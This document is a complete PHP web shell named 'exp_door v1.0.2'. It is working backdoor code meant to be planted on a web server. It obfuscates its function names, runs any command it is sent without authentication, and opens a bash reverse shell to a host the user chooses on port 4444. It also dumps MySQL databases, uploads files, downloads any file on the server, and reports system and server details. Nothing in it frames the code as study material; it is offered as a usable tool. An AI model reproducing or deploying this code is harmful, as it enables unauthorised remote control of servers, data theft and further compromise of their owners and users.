<!DOCTYPE html>
<html style="background-color: #D3D3D3;">
<head>
<title>exp_door v1.0.2</title>
<link href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAACXBIWXMAAAOKAAADigGnjPUfAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAg9JREFUeNrEV4GRgyAQjJkUQAl+BW8JlGAJfgeWQAmW4HdgCZRgCSmBDnhufsnfXBDBOB9nbhI54Ja95cDGe39553Mt6dQ0TUv2NgDhoeDdBrjuPwC4YHrDN70CoCnVQFgpgWhDfyfaaYKP0H4/AuAmJusF1RRsRlBLFvpoAeIL7YZ+q4EQA2CBghtmNBE51mAKKfARFNiIY8m3wE/jhujbs7zzNxD9GfFu8B6N8q9Y/xZMeTD3MgAVWWBtgwCxchDoE0FMLwEQk/GVdgicBAF/9LW5+a8JtQ/BxmAKTRa/mumGGKEg32j6FNtRiRqyL0Kx6iXSzsQ37zBE1qGNs6OrU4Ad4RFcscnGRF+uiVkI1Ul9lAKIkw6JFd35qhhDMSAXqDkkQraKUTDiBZBJpECaOgrAyvwhmK+w9XAdYJTrDWZKzRwVoecaED7NynSpxfKtahlIVTldwIRDyjT0MzPdqBIAs5jQJhS+mfvkSv92li0B0FYElDtDZcq6eRJ3pnO3k+s10dZvpGsUh5upOYy0MCVOywjEJcY9FSX0f6ThVnBhsRmfC4fWgsNoFe5RvGt2y6q+lJ7xxKtax07Yy6X06rSTor0UOATupVbOAKDYjhkSu+mhG6TpXnUjKgRh+Ep3akt/OgBRPR2KjoL1zDdU3wkrUzFlClSfGtec/XWMj1jN7oI2t5Wbd3+e/wgwAGD4W8SG5D6lAAAAAElFTkSuQmCC" rel="icon" type="image/png" />

<style type="text/css">
b {
color:#008800;
font-style:bold;}
hr {border:1px !important;height: 1px;background-color:#7d7171 !important;color:#7d7171 !important;}
body {font-family: sans-serif !important;color:black !important;}
pre {margin: 0;}
//input[type=file]{color: transparent;}
</style>
</head>
<body style="background-color: #D3D3D3;">


<?php
$a1='pas'.'sth'.'ru';
$b2='ex'.'ec';
$aTwo = "ba"."se"."6"."4"."_"."en"."co"."de";
$bTwo = "ba"."se"."6"."4"."_"."de"."co"."de";
$id="id";
$pwd=__DIR__;
$uname=php_uname();
$php=phpversion();
$temp_file=sys_get_temp_dir();
$down="which get;which wget;which lynx;which curl;which fetch;which links;";
$fun=$bTwo("cGhwIC1yICdwcmludF9yKGdldF9kZWZpbmVkX2Z1bmN0aW9ucygpKTsnIHwgZ3JlcCAtRSAnIChzeXN0ZW18ZXhlY3xzaGVsbF9leGVjfHBhc3N0aHJ1fHByb2Nfb3Blbnxwb3BlbnxjdXJsX2V4ZWN8Y3VybF9tdWx0aV9leGVjfHBhcnNlX2luaV9maWxlfHNob3dfc291cmNlKSc");

echo '<pre>';
echo 'id    | ';
echo $a1($id);
echo 'pwd   | '.$pwd.'<br>';
echo 'uname | '.$uname.'<br>';
echo 'tmp   | '.$temp_file.' '.substr(sprintf('%o', fileperms($temp_file)), -4).'<br>';
echo 'php   | '.$php.'<br>';
echo 'server| '.$_SERVER['SERVER_NAME'].' '.$_SERVER["SERVER_ADDR"].' '.$_SERVER['SERVER_SOFTWARE'];
echo '</pre>';
?>

<hr>
<form style="float:left;margin-right:20px;"method="POST">
<input type="password" name="name" placeholder="DB name" required><br/>
<input type="password" name="user" placeholder="DB user" required><br/>
<input type="password" name="pass" placeholder="DB pass" required><br/> 
<input type="password" name="host" placeholder="MySQL host" required><br/>
<button type="submit" name="DB">Save DB to file.zip</button></p>   
</form>

<form style="display:inline" method="POST">
<input type=text name=cmd placeholder="CMD">
</form>

<form style="display:inline" method="POST">
    <input type="submit" name="info" value="phpinfo"/>
    <input type="submit" name="ip" value="my ip"/>
    <input type="submit" name="down" value="downloaders"/>
    <input type="submit" name="fun" value="functions"/>
</form>


<hr>

<div style="float: left;display:block;width:208color: transparent;px">
<pre>
<form method='POST'>
 <label><b>Base64 encode/decode:</b></label>
 <input style="width:178px" type=text name='base64'> 
 <input type='submit' name='submit' value='Encode'><input type='submit' name='submit2' value='Decode'>
</form>
</pre>
</div>

<div style="float: left;display:block;width:208px">
<pre>
<form  method='POST'>
 <label><b>URL encode/decode:</b></label>
 <input style="width:178px" type='text' name='url'>
 <input type='submit' name='submit_u' value='Encode'><input type='submit' name='submit_u2' value='Decode'>   
</form>
</pre>
</div>

<div style="float: left;display:block;width:208px">
<pre>
<form  method='POST'>
 <label><b>BackConnect to 4444:</b></label>   
 <input style="width:178px" type="text" name="host_" placeholder="Enter host" required>
 <input type="submit" name="reverse" value="reverse">
</form>
</pre>
</div>

<div style="float: left;display:block;width:208px">
<pre>
<form  method='POST'>
 <label><b>Downloader:</b></label>   
 <input style="width:178px" type="text" name="files" placeholder="Enter patch/file" required>
 <input type="submit" name="downl" value="Download">
</form>
</pre>
</div>

<div style="float: left;display:block">
<pre>
<form method="POST" enctype='multipart/form-data'>
 <label><b>Uploader:</b></label>
 <input type='file' name='filename' ><br/>
 <input type='submit' value='Upload'>
</form>
<pre>
</div>

<hr style="clear:both">


<?php
if ($_FILES && $_FILES['filename']['error']== UPLOAD_ERR_OK)
{
    $name = $_FILES['filename']['name'];
    move_uploaded_file($_FILES['filename']['tmp_name'], $name);
    echo '<p style="color: red">'.'File Uploaded'.'</p>';
}

    if(isset($_POST['info']))
    {echo phpinfo();}
    if(isset($_POST['ip']))
    {print $_SERVER['REMOTE_ADDR'];}
    if(isset($_POST['down']))
    {
echo '<pre>';
echo $a1($down);
echo '</pre>';
}
    if(isset($_POST['fun']))
    {
    echo '<pre>';
    echo $a1($fun);
    echo '</pre>';
}

    if (isset($_POST['submit'])) {
    $base64 = $_POST['base64'];
    $encode = $aTwo($base64);
echo '<p style="color: red">'."Encode base64: ".'</p>'.$encode;
}
    if (isset($_POST['submit2'])) {
    $base64_d = $_POST['base64'];
    $decode = $bTwo($base64_d);
echo '<p style="color: red">'."Decode base64: ".'</p>'.htmlentities($decode);
}

if (isset($_POST['submit_u'])) {
  $url = $_POST['url'];
  $encode_u = urlencode($url);
  echo '<p style="color: red">'."Encode url: ".'</p>'.$encode_u;
}
if (isset($_POST['submit_u2'])) {
  $url_d = $_POST['url'];
  $decode_u = urldecode($url_d);
  echo '<p style="color: red">'."Decode url: ".'</p>'.htmlentities($decode_u);
}

if (isset($_POST['reverse'])) {   
   $back = $_POST['host_'];
   $a1("bash -c 'bash -i &> /dev/tcp/$back/4444 0>&1'");
  
}
?>

<pre>
<div style="float:left;margin-bottom:20px">
<?php
if(isset($_POST['cmd'])){
$a1($_POST['cmd']);
}
?>
</div>
</pre>


<?php

if(isset($_POST['DB'])){
$host = $_POST['host'];
$user = $_POST['user'];
$pass = $_POST['pass'];
$name = $_POST['name'];
$link = new mysqli($host, $user, $pass, $name);

if ($link->connect_error) {
    die("<b>Database access is not available:</b><br>".$link->connect_error);exit();
}else
    {$b2('mysqldump --user='.$user.' --password='.$pass.' --host='.$host.' '.$name.' > file.zip');echo 'Database access<br>';}
}
?>


<?php
 
if(isset($_POST['downl'])){
$file = $_POST['files'];
  if (file_exists($file)) {
  
    if (ob_get_level()) {
      ob_end_clean();
    }   
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename=' . basename($file));
    header('Content-Transfer-Encoding: binary');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
  } else{ echo '<p style="color: red">'.'File '.$file.' not exist!'.'</p>';
}
}
?>



</body>
</html>